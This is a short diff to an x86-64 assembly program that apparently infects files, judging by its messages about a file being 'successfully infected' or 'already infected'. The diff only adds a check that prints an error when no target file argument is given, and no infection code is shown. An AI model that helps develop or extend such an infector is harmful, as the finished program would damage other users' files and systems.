@@ -25,6 +25,10 @@ section .data
 
     after_infect_msg db "The provided file was successfully infected.", 10
     after_infect_len equ $ - after_infect_msg
+
+    no_arg_msg db "Please provide a file to infect.", 10
+    no_arg_len equ $ - no_arg_msg
+
     is_inf_msg db "The provided file is already infected.", 10
     is_inf_len equ $ - is_inf_msg
 
@@ -103,9 +107,13 @@ section .text
     global _start
 
 _start:
+    mov rbx, [rsp + 16] ; rsp + 16 is argv[1]
+    test rbx, rbx       ; if rbx is 0, no arg was provided
+    jz no_arg
+    
     ; Open the file
     mov rax, 2
-    mov rdi, [rsp + 16] ; rsp + 16 is argv[1]
+    mov rdi, rbx 
     mov rsi, [flags]
     mov rdx, [mode]
     syscall
@@ -130,6 +138,15 @@ _start:
 
     ; Check if it is a directory
     jmp check_dir
+
+no_arg:
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, no_arg_msg
+    mov rdx, no_arg_len
+    syscall
+
+    jmp close
 
 check_dir:
     ; Depending on the file descriptor LSB, we know if it's a file, a directory or a missing file
